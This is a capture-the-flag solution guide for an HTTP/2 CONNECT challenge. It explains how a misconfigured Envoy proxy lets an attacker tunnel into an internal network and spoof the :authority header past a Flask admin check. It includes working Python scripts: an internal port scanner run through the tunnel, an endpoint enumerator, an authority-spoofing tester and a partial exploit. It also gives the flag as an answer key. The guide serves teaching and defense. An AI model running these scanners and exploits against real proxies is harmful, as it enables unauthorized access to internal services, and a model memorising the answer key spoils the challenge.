# HTTP/2 CONNECT Wargame - Complete Solution Guide

**Admin-Only Documentation**
**Version:** 1.0
**Last Updated:** 2026-03-20
**Challenge Type:** Hard Mode Black-Box CTF

---

## Table of Contents

1. [Challenge Overview](#1-challenge-overview)
2. [Learning Objectives](#2-learning-objectives)
3. [Vulnerability Analysis](#3-vulnerability-analysis)
4. [Step-by-Step Solution](#4-step-by-step-solution)
5. [Exploit Code Examples](#5-exploit-code-examples)
6. [Defense Recommendations](#6-defense-recommendations)
7. [Environment Setup Guide](#7-environment-setup-guide)
8. [Expected Solve Time & Difficulty](#8-expected-solve-time--difficulty)
9. [Educational Value](#9-educational-value)
10. [Appendices](#10-appendices)

---

## 1. Challenge Overview

### 1.1 Scenario

Participants are tasked with finding a flag hidden in an internal network behind a misconfigured HTTP/2 proxy server. The challenge simulates a real-world scenario where:

- An organization deploys an Envoy proxy with HTTP/2 CONNECT support for legitimate forward proxy use cases
- The proxy lacks proper IP-based access controls (RBAC)
- A backend service trusts the Host header (derived from HTTP/2 `:authority` pseudo-header) for access control
- Internal network ranges are not protected from SSRF attacks

This configuration mirrors common mistakes in production environments where:
- Developers enable HTTP/2 CONNECT without understanding its security implications
- Host-based authentication is used instead of proper mutual TLS or IP validation
- Internal networks rely on network segmentation alone for security

### 1.2 Objectives

**Primary Goal**: Extract the flag from the internal admin panel

**Secondary Goals** (implicit):
1. Discover that the proxy supports HTTP/2
2. Identify that HTTP/2 CONNECT method is enabled
3. Map the internal network topology
4. Find the backend service and its endpoints
5. Bypass Host header-based access control
6. Demonstrate understanding of HTTP/2 protocol mechanics

### 1.3 Flag

**Format**: `WSL{http2_authority_header_confusion}`

**Location**: `/admin` endpoint on backend service (172.20.0.10:8080)

**Conditions for Access**:
- Request must reach backend via HTTP/2 CONNECT tunnel
- `:authority` pseudo-header must contain `internal.acme.corp`
- No authentication required (vulnerability)

### 1.4 Difficulty Rating

**Hard Mode**: No hints, skeleton code, or tools provided

**Required Skills**:
- HTTP/2 protocol understanding
- Python scripting (h2 library or similar)
- Network reconnaissance techniques
- Web application security fundamentals

**Estimated Time**: 2-4 hours for experienced CTF players

---

## 2. Learning Objectives

### 2.1 Technical Skills

Participants will learn:

1. **HTTP/2 Protocol Mechanics**
   - Pseudo-headers (`:method`, `:authority`, `:scheme`, `:path`)
   - CONNECT method for tunneling
   - Binary framing and stream multiplexing
   - SETTINGS frame negotiation

2. **Server-Side Request Forgery (SSRF)**
   - Using HTTP/2 CONNECT for network pivoting
   - Bypassing network-based access controls
   - Internal network reconnaissance via SSRF
   - Difference between traditional SSRF and CONNECT-based SSRF

3. **Header Confusion Attacks**
   - HTTP/2 `:authority` vs HTTP/1.1 `Host` header
   - How proxies translate between HTTP/2 and HTTP/1.1
   - Trust boundary violations in header processing
   - Authority header spoofing techniques

4. **Network Reconnaissance**
   - Port scanning through proxy tunnels
   - Service enumeration in restricted networks
   - Identifying live hosts without direct access

5. **Python Security Tooling**
   - Using the `h2` library for raw HTTP/2 interactions
   - Building custom port scanners
   - Automating multi-step exploits
   - Handling binary protocol data

### 2.2 Security Concepts

1. **Defense in Depth**: Understanding why multiple layers of security are necessary
2. **Principle of Least Privilege**: Why proxies should restrict CONNECT targets
3. **Input Validation**: The importance of validating all request attributes, not just bodies
4. **Trust Boundaries**: Recognizing where to validate vs. trust data

---

## 3. Vulnerability Analysis

### 3.1 CVE and CWE References

This challenge demonstrates real-world vulnerability classes:

**CWE-918**: Server-Side Request Forgery (SSRF)
- **Description**: The proxy allows CONNECT to arbitrary internal IP addresses
- **Impact**: Attackers can access internal services not exposed to the internet
- **Real-world examples**: AWS metadata service access, internal API exploitation

**CWE-444**: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')
- **Description**: Confusion between HTTP/2 `:authority` and HTTP/1.1 `Host` header
- **Impact**: Bypass of host-based access controls
- **Related**: Request smuggling, header injection attacks

**CWE-284**: Improper Access Control
- **Description**: Backend relies on unauthenticated header value for authorization
- **Impact**: Complete bypass of admin panel access control
- **Mitigation**: Use proper authentication (mutual TLS, API keys, OAuth)

### 3.2 Envoy Proxy Misconfiguration

**File**: `envoy/envoy.yaml`

**Vulnerable Configuration**:

```yaml
http2_protocol_options:
  allow_connect: true  # Enables HTTP/2 CONNECT

routes:
- match:
    connect_matcher: {}  # CRITICAL: Matches ALL CONNECT requests
  route:
    cluster: dynamic_forward_proxy_cluster
    upgrade_configs:
    - upgrade_type: CONNECT
      connect_config: {}
```

**Root Cause**:

1. **No IP-based filtering**: `connect_matcher: {}` accepts CONNECT to any destination
2. **No RBAC policies**: Missing `envoy.filters.http.rbac` to block internal IP ranges
3. **Dynamic forward proxy**: Routes all CONNECT requests to arbitrary destinations

**Secure Configuration Should Include**:

```yaml
# Example of secure RBAC policy (NOT in challenge)
- name: envoy.filters.http.rbac
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
    rules:
      action: DENY
      policies:
        "block-internal-ips":
          permissions:
          - any: true
          principals:
          - any: true
          condition:
            call_expr:
              function: matches
              args:
              - select_expr:
                  operand:
                    select_expr:
                      operand:
                        ident_expr: request
                      field: authority
                  field: host
              - const_expr:
                  string_value: "^(10\\..*|172\\.(1[6-9]|2[0-9]|3[01])\\..*|192\\.168\\..*|127\\..*|localhost)$"
```

**Why This Matters**:

- **Real-world prevalence**: Many organizations enable HTTP/2 CONNECT for legitimate forward proxy use
- **Default insecurity**: Envoy does not block internal IPs by default
- **Operational complexity**: RBAC policies are complex, often omitted or misconfigured

### 3.3 Flask Backend Vulnerability

**File**: `backend/app.py`

**Vulnerable Code**:

```python
@app.route('/admin')
def admin():
    host = request.headers.get('Host', '')

    # VULNERABLE: Substring match, no IP validation, no authentication
    if 'internal.acme.corp' in host.lower():
        return f"<h1>Admin Panel</h1><p>FLAG: {FLAG}</p>"
    else:
        abort(403, "Access denied: External access forbidden")
```

**Attack Vector**:

1. Flask receives HTTP/1.1 request from Envoy after protocol translation
2. `Host` header is derived from HTTP/2 `:authority` pseudo-header
3. No validation that request originated from internal network
4. Attacker controls `:authority` value in tunneled request

**Exploitation Flow**:

```
Attacker                 Envoy Proxy              Backend (Flask)
   |                          |                         |
   |--CONNECT 172.20.0.10:8080->|                        |
   |<-----200 Connection Est----|                        |
   |                          |                         |
   |--GET /admin------------>|                         |
   |  :authority: internal.acme.corp                    |
   |                          |--HTTP/1.1 GET /admin--->|
   |                          |  Host: internal.acme.corp|
   |                          |                         |
   |                          |<-----FLAG---------------|
   |<-----FLAG----------------|                         |
```

**Why This Works**:

1. `:authority` pseudo-header is attacker-controlled in HTTP/2
2. Envoy translates `:authority` to `Host` header when forwarding to HTTP/1.1 backend
3. Flask trusts `Host` header value without source IP validation
4. Access control check passes because substring match succeeds

**Secure Implementation**:

```python
# Example secure version (NOT in challenge)
@app.route('/admin')
def admin():
    # Method 1: IP-based restriction (works with reverse proxy)
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if not client_ip.startswith('172.20.0.'):
        abort(403, "Access denied: Must access from internal network")

    # Method 2: Mutual TLS (best practice)
    client_cert = request.environ.get('SSL_CLIENT_CERT')
    if not verify_client_certificate(client_cert):
        abort(403, "Access denied: Invalid client certificate")

    # Method 3: API key authentication
    api_key = request.headers.get('X-API-Key')
    if api_key != INTERNAL_API_KEY:
        abort(403, "Access denied: Invalid API key")

    return f"<h1>Admin Panel</h1><p>FLAG: {FLAG}</p>"
```

### 3.4 Attack Surface Summary

| Component | Vulnerability | Severity | Exploitability |
|-----------|---------------|----------|----------------|
| Envoy Proxy | No RBAC for CONNECT destinations | Critical | Easy (protocol knowledge required) |
| Flask Backend | Host header trust | High | Trivial (once CONNECT tunnel established) |
| Network Segmentation | No egress filtering from proxy | Medium | N/A (design issue) |
| Service Discovery | Predictable IPs | Low | Easy (standard /24 scan) |

**Combined Impact**: Critical

- Unauthenticated remote access to internal admin panel
- Full compromise of backend service
- Potential lateral movement to other internal services

---

## 4. Step-by-Step Solution

This section provides the complete intended solve path with detailed explanations.

### 4.1 Step 1: Protocol Reconnaissance (15-30 minutes)

**Objective**: Determine that the target supports HTTP/2 and CONNECT method

**Actions**:

1. **Initial Connection Test**:

```bash
curl -v http://localhost:10000/
```

**Expected Output**:

```
* Connected to localhost (127.0.0.1) port 10000
> GET / HTTP/1.1
> Host: localhost:10000
> User-Agent: curl/8.4.0
> Accept: */*
>
< HTTP/1.1 200 OK
< content-length: 182
< content-type: text/html; charset=utf-8
<
<html>
    <head><title>ACME Corp Backend</title></head>
    <body>
        <h1>ACME Corp Backend Service</h1>
        <p>Backend API is operational.</p>
        <p>Version: 1.0.0</p>
    </body>
</html>
```

**Analysis**:
- Service is HTTP-based, returns HTML
- Default route proxies to backend service
- No obvious attack vector yet

2. **HTTP/2 Detection**:

```bash
curl -v --http2 http://localhost:10000/
```

**Expected Output**:

```
* Connected to localhost (127.0.0.1) port 10000
* [HTTP/2] [1] OPENED stream for http://localhost:10000/
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: http]
* [HTTP/2] [1] [:authority: localhost:10000]
* [HTTP/2] [1] [:path: /]
* [HTTP/2] [1] [user-agent: curl/8.4.0]
* [HTTP/2] [1] [accept: */*]
> GET / HTTP/2
> Host: localhost:10000
>
< HTTP/2 200
< content-length: 182
< content-type: text/html; charset=utf-8
```

**Analysis**:
- **Critical Discovery**: Server supports HTTP/2 (HTTP/2 200 response)
- Protocol upgrade successful
- This opens possibility of HTTP/2-specific attacks

3. **CONNECT Method Test**:

Since curl doesn't easily support HTTP/2 CONNECT, write a simple test script:

```python
#!/usr/bin/env python3
# test_connect.py

from h2.connection import H2Connection
from h2.config import H2Configuration
import socket

# Connect to proxy
sock = socket.create_connection(('localhost', 10000))
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# Receive server preface
data = sock.recv(65535)
events = conn.receive_data(data)
sock.sendall(conn.data_to_send())

# Try CONNECT to google.com:80
stream_id = conn.get_next_available_stream_id()
headers = [
    (':method', 'CONNECT'),
    (':authority', 'google.com:80'),
]
conn.send_headers(stream_id, headers, end_stream=False)
sock.sendall(conn.data_to_send())

# Read response
data = sock.recv(65535)
events = conn.receive_data(data)

for event in events:
    print(f"Event: {event}")

sock.close()
```

**Expected Output**:

```
Event: <ResponseReceived stream_id:1, headers:[(':status', '200')]>
```

**Analysis**:
- **CRITICAL FINDING**: Proxy accepts CONNECT method
- 200 response means tunnel established successfully
- This is the main attack vector (SSRF via CONNECT)

**Key Insight**: The combination of HTTP/2 + CONNECT support = potential for tunneling to arbitrary destinations, including internal networks.

### 4.2 Step 2: Testing CONNECT to Internal IPs (15-30 minutes)

**Objective**: Confirm that CONNECT can reach RFC1918 private IP ranges

**Actions**:

1. **Test CONNECT to Localhost**:

```python
#!/usr/bin/env python3
# test_internal_connect.py

from h2.connection import H2Connection
from h2.config import H2Configuration
import socket

def test_connect(target_host, target_port):
    """Test if CONNECT to target succeeds"""
    sock = socket.create_connection(('localhost', 10000))
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS exchange
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # CONNECT request
    stream_id = conn.get_next_available_stream_id()
    headers = [
        (':method', 'CONNECT'),
        (':authority', f'{target_host}:{target_port}'),
    ]
    conn.send_headers(stream_id, headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # Read response
    data = sock.recv(65535)
    events = conn.receive_data(data)

    for event in events:
        if hasattr(event, 'headers'):
            for name, value in event.headers:
                if name == b':status':
                    return value.decode() == '200'

    return False

# Test various internal IP ranges
targets = [
    ('127.0.0.1', 80),
    ('10.0.0.1', 80),
    ('172.20.0.1', 80),
    ('192.168.1.1', 80),
]

for host, port in targets:
    result = test_connect(host, port)
    print(f"{host}:{port} - {'SUCCESS' if result else 'FAILED'}")
```

**Expected Output**:

```
127.0.0.1:80 - FAILED (connection refused)
10.0.0.1:80 - FAILED (connection refused)
172.20.0.1:80 - FAILED (connection refused)
192.168.1.1:80 - FAILED (connection refused)
```

**Analysis**:
- CONNECT requests are accepted by proxy
- Connection failures indicate no service listening (not blocked by proxy)
- Need to scan for live services

**Key Insight**: Proxy does not block internal IP ranges - full SSRF capability confirmed.

### 4.3 Step 3: Internal Network Scanning (30-60 minutes)

**Objective**: Discover live services in the internal network

**Strategy**:
- Scan common Docker network ranges: 172.16-31.x.x
- Focus on typical Docker subnet: 172.20.0.0/24
- Test common service ports: 80, 8080, 8000, 3000, 5000

**Port Scanner Implementation**:

```python
#!/usr/bin/env python3
# scanner.py - Internal network port scanner via HTTP/2 CONNECT

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, StreamEnded, ConnectionTerminated
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_port(proxy_host, proxy_port, target_ip, target_port, timeout=2):
    """
    Scan a single port via HTTP/2 CONNECT tunnel

    Args:
        proxy_host: Proxy server hostname/IP
        proxy_port: Proxy server port
        target_ip: Internal target IP to scan
        target_port: Target port number
        timeout: Connection timeout in seconds

    Returns:
        tuple: (target_ip, target_port, is_open, error_msg)
    """
    try:
        # Connect to proxy
        sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
        sock.settimeout(timeout)

        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # SETTINGS exchange
        data = sock.recv(65535)
        events = conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # Send CONNECT request
        stream_id = conn.get_next_available_stream_id()
        headers = [
            (':method', 'CONNECT'),
            (':authority', f'{target_ip}:{target_port}'),
        ]
        conn.send_headers(stream_id, headers, end_stream=False)
        sock.sendall(conn.data_to_send())

        # Read response with timeout
        start_time = time.time()
        status_code = None

        while time.time() - start_time < timeout:
            try:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)

                for event in events:
                    if isinstance(event, ResponseReceived):
                        # Extract status code
                        for name, value in event.headers:
                            if name == b':status':
                                status_code = value.decode()
                                break

                    if isinstance(event, (StreamEnded, ConnectionTerminated)):
                        break

                sock.sendall(conn.data_to_send())

                if status_code:
                    break

            except socket.timeout:
                break

        sock.close()

        # 200 = tunnel established (port open)
        # 503 = service unavailable (port closed/filtered)
        if status_code == '200':
            return (target_ip, target_port, True, None)
        else:
            return (target_ip, target_port, False, f"Status: {status_code}")

    except Exception as e:
        return (target_ip, target_port, False, str(e))


def scan_network(proxy_host, proxy_port, network_prefix, ports):
    """
    Scan entire network range for open ports

    Args:
        proxy_host: Proxy server hostname/IP
        proxy_port: Proxy server port
        network_prefix: Network prefix (e.g., '172.20.0')
        ports: List of ports to scan

    Returns:
        list: List of (ip, port) tuples for open ports
    """
    open_ports = []
    total_scans = 0
    completed_scans = 0

    print(f"[*] Scanning {network_prefix}.0/24 on ports {ports}")
    print(f"[*] Total scans: {256 * len(ports)}")

    # Use thread pool for concurrent scanning
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []

        # Submit scan jobs
        for last_octet in range(1, 255):  # Skip .0 and .255
            target_ip = f"{network_prefix}.{last_octet}"
            for port in ports:
                future = executor.submit(
                    scan_port,
                    proxy_host,
                    proxy_port,
                    target_ip,
                    port
                )
                futures.append(future)
                total_scans += 1

        # Process results
        for future in as_completed(futures):
            completed_scans += 1
            ip, port, is_open, error = future.result()

            if is_open:
                print(f"[+] OPEN: {ip}:{port}")
                open_ports.append((ip, port))

            # Progress indicator
            if completed_scans % 100 == 0:
                print(f"[*] Progress: {completed_scans}/{total_scans} ({completed_scans*100//total_scans}%)")

    print(f"[*] Scan complete. Found {len(open_ports)} open ports.")
    return open_ports


if __name__ == '__main__':
    # Configuration
    PROXY_HOST = 'localhost'
    PROXY_PORT = 10000
    NETWORK_PREFIX = '172.20.0'
    COMMON_PORTS = [80, 8080, 8000, 3000, 5000, 8888, 9090]

    # Run scan
    open_ports = scan_network(PROXY_HOST, PROXY_PORT, NETWORK_PREFIX, COMMON_PORTS)

    # Display results
    print("\n" + "="*50)
    print("SCAN RESULTS")
    print("="*50)
    for ip, port in sorted(open_ports):
        print(f"{ip}:{port}")
```

**Expected Output**:

```
[*] Scanning 172.20.0.0/24 on ports [80, 8080, 8000, 3000, 5000, 8888, 9090]
[*] Total scans: 1778
[*] Progress: 100/1778 (5%)
[+] OPEN: 172.20.0.10:8080
[*] Progress: 200/1778 (11%)
[*] Progress: 300/1778 (16%)
[+] OPEN: 172.20.0.20:3000
[*] Progress: 400/1778 (22%)
...
[*] Scan complete. Found 2 open ports.

==================================================
SCAN RESULTS
==================================================
172.20.0.10:8080
172.20.0.20:3000
```

**Analysis**:
- **172.20.0.10:8080** - Backend service (primary target)
- **172.20.0.20:3000** - Internal service (decoy)

**Key Insight**: Two services discovered. Port 8080 is typical for web backends, likely the main target.

### 4.4 Step 4: Service Enumeration (20-30 minutes)

**Objective**: Identify endpoints and functionality on discovered services

**HTTP-over-CONNECT Function**:

```python
#!/usr/bin/env python3
# http_via_connect.py - Send HTTP requests through CONNECT tunnel

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket

def http_via_connect(proxy_host, proxy_port, target_host, target_port,
                     method, path, headers=None, body=None):
    """
    Send HTTP request through HTTP/2 CONNECT tunnel

    Args:
        proxy_host: Proxy server hostname
        proxy_port: Proxy server port
        target_host: Target service IP
        target_port: Target service port
        method: HTTP method (GET, POST, etc.)
        path: Request path
        headers: Additional headers (list of tuples)
        body: Request body (bytes)

    Returns:
        tuple: (status_code, response_headers, response_body)
    """
    # Connect to proxy
    sock = socket.create_connection((proxy_host, proxy_port), timeout=10)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS exchange
    data = sock.recv(65535)
    events = conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # Step 1: Establish CONNECT tunnel
    connect_stream_id = conn.get_next_available_stream_id()
    connect_headers = [
        (':method', 'CONNECT'),
        (':authority', f'{target_host}:{target_port}'),
    ]
    conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # Wait for CONNECT response
    data = sock.recv(65535)
    events = conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # Verify CONNECT succeeded
    connect_success = False
    for event in events:
        if isinstance(event, ResponseReceived):
            for name, value in event.headers:
                if name == b':status' and value == b'200':
                    connect_success = True

    if not connect_success:
        sock.close()
        return (None, None, None)

    # Step 2: Send actual HTTP request through tunnel
    request_stream_id = conn.get_next_available_stream_id()

    request_headers = [
        (':method', method),
        (':scheme', 'http'),
        (':authority', f'{target_host}:{target_port}'),
        (':path', path),
    ]

    if headers:
        request_headers.extend(headers)

    conn.send_headers(request_stream_id, request_headers, end_stream=(body is None))
    sock.sendall(conn.data_to_send())

    if body:
        conn.send_data(request_stream_id, body, end_stream=True)
        sock.sendall(conn.data_to_send())

    # Step 3: Read response
    status_code = None
    response_headers = []
    response_body = b''
    stream_ended = False

    while not stream_ended:
        data = sock.recv(65535)
        if not data:
            break

        events = conn.receive_data(data)

        for event in events:
            if isinstance(event, ResponseReceived):
                if event.stream_id == request_stream_id:
                    for name, value in event.headers:
                        if name == b':status':
                            status_code = value.decode()
                        else:
                            response_headers.append((name.decode(), value.decode()))

            elif isinstance(event, DataReceived):
                if event.stream_id == request_stream_id:
                    response_body += event.data
                    conn.acknowledge_received_data(
                        event.flow_controlled_length,
                        event.stream_id
                    )

            elif isinstance(event, StreamEnded):
                if event.stream_id == request_stream_id:
                    stream_ended = True

        sock.sendall(conn.data_to_send())

    sock.close()
    return (status_code, response_headers, response_body)


# Test function
def enumerate_service(proxy_host, proxy_port, target_ip, target_port):
    """Enumerate endpoints on a service"""
    print(f"\n[*] Enumerating {target_ip}:{target_port}")

    common_paths = [
        '/',
        '/admin',
        '/api',
        '/health',
        '/status',
        '/login',
        '/dashboard',
        '/api/status',
    ]

    for path in common_paths:
        status, headers, body = http_via_connect(
            proxy_host, proxy_port,
            target_ip, target_port,
            'GET', path
        )

        if status:
            body_preview = body[:100].decode('utf-8', errors='ignore')
            print(f"[+] {path} -> {status} ({len(body)} bytes)")
            if status != '404':
                print(f"    Preview: {body_preview}...")
        else:
            print(f"[-] {path} -> FAILED")


if __name__ == '__main__':
    PROXY_HOST = 'localhost'
    PROXY_PORT = 10000

    # Enumerate backend service
    enumerate_service(PROXY_HOST, PROXY_PORT, '172.20.0.10', 8080)

    # Enumerate internal service
    enumerate_service(PROXY_HOST, PROXY_PORT, '172.20.0.20', 3000)
```

**Expected Output**:

```
[*] Enumerating 172.20.0.10:8080
[+] / -> 200 (182 bytes)
    Preview: <html>
    <head><title>ACME Corp Backend</title></head>
    <body>
        <h1>ACME Corp Backend Service</h1>
...
[+] /admin -> 403 (93 bytes)
    Preview: <!doctype html>
<html lang=en>
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>Access denied: External ac...
[+] /health -> 200 (2 bytes)
    Preview: OK...
[+] /api/status -> 200 (77 bytes)
    Preview: {"service":"ACME Corp Backend","status":"operational","version":"1.0.0"}
...
[-] /login -> 404
[-] /dashboard -> 404

[*] Enumerating 172.20.0.20:3000
[+] / -> 200 (138 bytes)
    Preview: {
  "message": "Nothing interesting here",
  "path": "/",
  "service": "Internal Service",
  "timestamp": ...
```

**Analysis**:
- Backend service (172.20.0.10:8080):
  - `/` - Public homepage (200)
  - **`/admin` - Returns 403 Forbidden** ← Primary target
  - `/health` - Health check (200)
  - `/api/status` - Status endpoint (200)

- Internal service (172.20.0.20:3000):
  - Only generic responses
  - Likely a decoy

**Key Finding**: `/admin` endpoint exists but returns 403. Error message: "Access denied: External access forbidden". This suggests host-based or IP-based access control.

### 4.5 Step 5: Access Control Analysis (15-20 minutes)

**Objective**: Understand why `/admin` returns 403 and bypass the restriction

**Hypothesis Testing**:

1. **Test Different Host Headers**:

```python
#!/usr/bin/env python3
# test_host_headers.py

from http_via_connect import http_via_connect

PROXY_HOST = 'localhost'
PROXY_PORT = 10000
TARGET_IP = '172.20.0.10'
TARGET_PORT = 8080

# Test various Host header values
test_hosts = [
    'localhost',
    '172.20.0.10',
    '172.20.0.10:8080',
    'backend.acme.corp',
    'admin.acme.corp',
    'internal.acme.corp',
    'acme.corp',
]

for host in test_hosts:
    print(f"\n[*] Testing Host: {host}")

    status, headers, body = http_via_connect(
        PROXY_HOST, PROXY_PORT,
        TARGET_IP, TARGET_PORT,
        'GET', '/admin',
        headers=[('host', host)]
    )

    print(f"    Status: {status}")
    if status == '200':
        print(f"    SUCCESS! Body preview:")
        print(f"    {body[:200].decode('utf-8', errors='ignore')}")
    elif b'FLAG' in body or b'WSL{' in body:
        print(f"    FLAG FOUND!")
        print(f"    {body.decode('utf-8', errors='ignore')}")
```

**Wait - Important Realization**:

In HTTP/2, the `:authority` pseudo-header (not the `host` header) controls what becomes the `Host` header at the backend. Need to modify approach:

```python
#!/usr/bin/env python3
# test_authority_headers.py

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket

def test_authority(authority_value):
    """Test /admin with specific :authority value"""

    # Connect to proxy
    sock = socket.create_connection(('localhost', 10000), timeout=10)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS exchange
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # CONNECT tunnel
    connect_stream_id = conn.get_next_available_stream_id()
    connect_headers = [
        (':method', 'CONNECT'),
        (':authority', '172.20.0.10:8080'),
    ]
    conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # Read CONNECT response
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # GET /admin with custom :authority
    request_stream_id = conn.get_next_available_stream_id()
    request_headers = [
        (':method', 'GET'),
        (':scheme', 'http'),
        (':authority', authority_value),  # ← Custom value
        (':path', '/admin'),
    ]
    conn.send_headers(request_stream_id, request_headers, end_stream=True)
    sock.sendall(conn.data_to_send())

    # Read response
    status_code = None
    response_body = b''
    stream_ended = False

    while not stream_ended:
        data = sock.recv(65535)
        if not data:
            break

        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, ResponseReceived) and event.stream_id == request_stream_id:
                for name, value in event.headers:
                    if name == b':status':
                        status_code = value.decode()

            elif isinstance(event, DataReceived) and event.stream_id == request_stream_id:
                response_body += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)

            elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
                stream_ended = True

        sock.sendall(conn.data_to_send())

    sock.close()
    return status_code, response_body


# Test different :authority values
test_values = [
    'localhost',
    '172.20.0.10',
    '172.20.0.10:8080',
    'backend.acme.corp',
    'admin.acme.corp',
    'internal.acme.corp',
    'acme.corp',
]

for authority in test_values:
    print(f"\n[*] Testing :authority = {authority}")
    status, body = test_authority(authority)
    print(f"    Status: {status}")

    if status == '200':
        print(f"    SUCCESS!")
        print(f"    Body:\n{body.decode('utf-8', errors='ignore')}")
        break
    elif status == '403':
        # Extract error message
        if b'Access denied' in body:
            error_start = body.find(b'<p>')
            error_end = body.find(b'</p>', error_start)
            if error_start != -1 and error_end != -1:
                error_msg = body[error_start+3:error_end].decode('utf-8', errors='ignore')
                print(f"    Error: {error_msg}")
```

**Expected Output**:

```
[*] Testing :authority = localhost
    Status: 403
    Error: Access denied: External access to admin panel is forbidden

[*] Testing :authority = 172.20.0.10
    Status: 403
    Error: Access denied: External access to admin panel is forbidden

[*] Testing :authority = 172.20.0.10:8080
    Status: 403
    Error: Access denied: External access to admin panel is forbidden

[*] Testing :authority = backend.acme.corp
    Status: 403
    Error: Access denied: External access to admin panel is forbidden

[*] Testing :authority = admin.acme.corp
    Status: 403
    Error: Access denied: External access to admin panel is forbidden

[*] Testing :authority = internal.acme.corp
    Status: 200
    SUCCESS!
    Body:

        <html>
            <head><title>Admin Panel</title></head>
            <body>
                <h1>Admin Panel</h1>
                <p>Welcome to the internal admin panel.</p>
                <p><strong>FLAG:</strong> WSL{http2_authority_header_confusion}</p>
            </body>
        </html>
```

**Analysis**:
- `:authority` value `internal.acme.corp` bypasses access control
- Backend Flask app checks if `Host` header contains "internal.acme.corp"
- `:authority` pseudo-header becomes `Host` header after Envoy translation
- **FLAG CAPTURED**: `WSL{http2_authority_header_confusion}`

**Key Insight**: The vulnerability is in trusting the `:authority` header for access control. Since this header is attacker-controlled in HTTP/2, it can be trivially spoofed.

### 4.6 Step 6: Final Exploit (5-10 minutes)

**Objective**: Create clean, automated exploit script

See Section 5 for complete exploit code.

---

## 5. Exploit Code Examples

### 5.1 Minimal Exploit (Quick Win)

```python
#!/usr/bin/env python3
"""
Minimal exploit for HTTP/2 CONNECT Challenge
Extracts flag from internal admin panel
"""

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket
import sys

def exploit():
    """Extract flag from internal admin panel"""

    print("[*] HTTP/2 CONNECT Challenge - Exploit")
    print("[*] Target: localhost:10000")
    print()

    # Step 1: Connect to proxy
    print("[+] Connecting to proxy...")
    sock = socket.create_connection(('localhost', 10000), timeout=10)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS exchange
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # Step 2: Establish CONNECT tunnel to backend
    print("[+] Establishing CONNECT tunnel to 172.20.0.10:8080...")
    connect_stream_id = conn.get_next_available_stream_id()
    connect_headers = [
        (':method', 'CONNECT'),
        (':authority', '172.20.0.10:8080'),
    ]
    conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # Wait for CONNECT response
    data = sock.recv(65535)
    events = conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # Verify tunnel established
    tunnel_ok = False
    for event in events:
        if isinstance(event, ResponseReceived):
            for name, value in event.headers:
                if name == b':status' and value == b'200':
                    tunnel_ok = True

    if not tunnel_ok:
        print("[-] Failed to establish CONNECT tunnel")
        sock.close()
        sys.exit(1)

    print("[+] Tunnel established")

    # Step 3: GET /admin with spoofed :authority
    print("[+] Sending GET /admin with :authority = internal.acme.corp...")
    request_stream_id = conn.get_next_available_stream_id()
    request_headers = [
        (':method', 'GET'),
        (':scheme', 'http'),
        (':authority', 'internal.acme.corp'),  # ← Spoofed!
        (':path', '/admin'),
    ]
    conn.send_headers(request_stream_id, request_headers, end_stream=True)
    sock.sendall(conn.data_to_send())

    # Step 4: Read response
    print("[+] Reading response...")
    status_code = None
    response_body = b''
    stream_ended = False

    while not stream_ended:
        data = sock.recv(65535)
        if not data:
            break

        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, ResponseReceived) and event.stream_id == request_stream_id:
                for name, value in event.headers:
                    if name == b':status':
                        status_code = value.decode()

            elif isinstance(event, DataReceived) and event.stream_id == request_stream_id:
                response_body += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)

            elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
                stream_ended = True

        sock.sendall(conn.data_to_send())

    sock.close()

    # Step 5: Extract flag
    if status_code == '200' and b'WSL{' in response_body:
        print()
        print("="*60)
        print("SUCCESS!")
        print("="*60)

        # Parse flag from HTML
        flag_start = response_body.find(b'WSL{')
